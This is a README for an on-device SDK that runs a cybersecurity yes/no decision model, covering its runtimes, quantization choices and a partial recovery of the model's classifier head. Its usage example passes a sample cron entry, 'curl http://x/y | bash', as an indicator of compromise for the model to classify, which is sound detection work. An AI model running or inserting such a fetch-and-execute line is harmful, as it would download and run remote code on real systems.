# ct0-edge

On-device SDK (browser, Node, edge) for **CT0 / alias3-micro-1026**, with **two runtimes** for the same model.

| runtime | import | `decide()` reads | best at |
|---|---|---|---|
| **ONNX** (default) | `ct0-edge` | the **logit** directly: `softmax(L[yesIds], L[noIds])`, zero tokens decoded | the faithful System-1 read; generation at ≈10 tok/s |
| **WebLLM / MLC** | `ct0-edge/webllm` | the `logprob` of the emitted token (`top_logprobs`) | faster long-form **generation** |

Both are one forward for `decide()`; neither is "the official System-1" (see *Fidelity* below).

- **`decide(state, question)`**: a yes/no security decision in a single forward — no tokens generated on the
  ONNX path. The primary interface, e.g. the per-check verdict of an on-device page-security scan.
- **`generate()`**: autoregressive text output (streaming), on both runtimes.

Calls are **stateless, single-turn**: each builds its own prompt from a fresh state, no session carried between calls.

### ONNX path (default)

Drives the **decode-only recurrent graph** `onnx/model_q4f16_decode.onnx` (≈2.73 GB) — the one that fits the
browser's ≈4 GB WASM cap and decodes at O(1)/token. **Requires `onnxruntime-web` ≥ 1.30** (earlier versions
miscompute quantized ops on WebGPU). No transformers.js PR needed.

### WebLLM (MLC) path — `ct0-edge/webllm`

Wraps an existing WebLLM `MLCEngine`; it does not bundle WebLLM. Same `{ decide, generate, stream }` shape,
so an `Agent` or `recon()` takes either runtime unchanged.

```js
import { webllmModel } from "ct0-edge/webllm";
import * as webllm from "@mlc-ai/web-llm";

const engine = await webllm.CreateMLCEngine(/* your MLC build */);
const model = webllmModel(engine, { noThink: true });   // see note below
```

**`noThink: true`** — models of the Qwen3 family (which this model is based on) enter a reasoning mode by
default and emit ` thinking` as the first token, so a 1-forward `decide` finds no `Yes`/`No` to read.
Measured on Qwen3.5-4B stock: **0/6** correct on a contrastive probe without it, **5/6** with `/no_think`.
The CT0 checkpoint answers `Yes`/`No` out of the box, so the flag is not needed for it — but it is what
makes the adapter usable with a stock base model.

### Fidelity — what `decide()` is and is not

The paper's native System-1 is a **bilinear pointer head** over marker tokens
(`<state> … <q> … <opt>…</opt> … <decide>`), served by a private SGLang fork (`--systemone-head`).

Two independent barriers stop that path, both verified against the official repository:
1. `head.pt` is a **truncated zip** — it has local file headers but **zero** central-directory entries and
   **no** end-of-central-directory record, so no reader can open it. (Recovering the readable parts shows
   `q.weight 2560×1024`, `k.weight 2560×256`, a `head` linear, `head_dim=256`, `temperature≈2.0`,
   `special_embeddings` — i.e. the bilinear head of the paper, with the final `head.*` tensors cut off.)
2. `--systemone-head` **does not exist** in the public `sglang` (verified: `unrecognized arguments`); the
   README states it is "available from Alias Robotics" — a private fork.

So `decide()` here is an **open stand-in**: it reads the model's own `Yes`/`No` logits rather than the
calibrated head. It is a strong binary separator (measured: 1.00 vs 0.00 on contrastive probes) but it is
**not** the paper's calibrated confidence, and the `P` values should be read as an ordering, not a
probability. This is stated plainly rather than presented as a reproduction.

Weights: **[eduardoworrel/ct0-alias3-micro-onnx](https://huggingface.co/eduardoworrel/ct0-alias3-micro-onnx)**
(ONNX export of [aliasrobotics/alias3-micro-1026](https://huggingface.co/aliasrobotics/alias3-micro-1026) — all model credit to Alias Robotics).

## Install

```bash
npm i ct0-edge @huggingface/transformers "onnxruntime-web@^1.30"
```

## Use

```js
import { CT0 } from "ct0-edge";

const ct0 = await CT0.load({ repo: "eduardoworrel/ct0-alias3-micro-onnx", onStatus: console.log });

const state = "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash";
const question = "Is this a suspicious indicator of compromise?";

// decision (one forward, reads logits)
const p = await ct0.decide(state, question);
console.log("P(yes) =", p);

// generate() is available too (independent call: it doesn't see the decide() above, so pass context again)
// for await (const piece of ct0.generate(`${question}\n${state}\nExplain.`)) process.stdout.write(piece);
```

## Which graph (measured in Chrome / WebGPU)

A 4B model must fit under the browser's ≈4 GB WASM cap. CT0's 248k-token vocab makes the embedding
huge, so it's quantized to **int4 (GatherBlockQuantized)**:

| graph (HF) | interface | size | fidelity¹ | browser speed | context |
|---|---|---|---|---|---|
| **`model_q4f16_decode`** (default) | custom (this lib) | **2.73 GB** | 9/16 | **≈10 tok/s** | unbounded (O(1)) |
| **`model_q4f16`** | standard `generate()` / transformers.js | 2.99 GB | 9/16 | ≈1.3 tok/s | unbounded (`Scan`) |
| `model_q4` / `model_fp16` | standard | 4.78 / 8.4 GB | 14–16/16 | — (Node only) | unbounded |

`model_q4f16` is the standard transformers.js file (`dtype:"q4f16"`); `model_q4f16_decode` is the same int4
weights in a custom decode-only graph this lib drives directly.

¹ greedy match vs fp32 over 16 tokens. **Trade-off:** fitting <4 GB needs the int4 embedding, which
costs fidelity (9/16); the 14–16/16 variants keep the embedding wide and don't fit the browser.

**Recipe:** `GatherBlockQuantized` embedding + `MatMulNBits` matmuls (`onnxruntime.quantization`),
on top of the optimum-onnx `qwen3_5` export. The default transformers.js q4 flow doesn't quantize the
embedding `Gather`, which is why large-vocab models otherwise overflow the browser.

## System-1 bilinear head — `ct0-edge/systemone` (optional)

An optional on-device head that reads the model's **hidden states** instead of the vocabulary logits.
It runs in **1.18 ms** per call (443× faster than a forward pass) because it is just a 256×2560
projection over a hidden state you already computed.

```js
import { loadHead, headScore } from "ct0-edge/systemone";
// weights: https://huggingface.co/eduardoworrel/ct0-alias3-micro-onnx/resolve/main/head.bin
const H = loadHead(await (await fetch(HEAD_URL)).arrayBuffer());   // 2.6 MB fp16
const score = headScore(H, hiddenAtDecide, hiddenAtLast);
const p = 1 / (1 + Math.exp(-score));
```

Requires the decode graph with the hidden-state output:
`decodeModel: "onnx/model_q4f16_decode_head.onnx"` (published in the same HF repo).
`ct0-edge/headdecide` adapts it to the plain `decide(state, question)` contract.

**Fidelity, stated plainly.** The head weights were recovered from the official `head.pt`, which is a
**truncated zip** (local file headers but no central directory and no EOCD):
`q.weight` / `q.bias` are byte-exact (CRC verified), `k.weight` is **89%** present (227 of 256 rows),
`k.bias` is lost and recovered as a scalar offset by bootstrap — the median of the scores, no labels.
Because the checkpoint has `head_lr = 0.0`, `q`/`k` are a fixed random projection, which is exactly
why the missing bias reduces to a scalar.

Measured with 8 base + 8 held-out probes: **`noul` 16/16**, correlation +0.984 with the vocabulary
logit read. `choice` (2/4) and `score` (3/6) do **not** reproduce with the partial head — they compare
magnitudes across positions, where the 29 missing rows of `k` inject noise of the same order as the
signal. See `EVIDENCE.md` §21.

## Related

- ONNX export (optimum): https://github.com/huggingface/optimum-onnx/pull/152
- transformers.js support: https://github.com/huggingface/transformers.js/pull/1803

## License

MIT (this SDK). The **model** weights follow the license of the
[base model](https://huggingface.co/aliasrobotics/alias3-micro-1026).
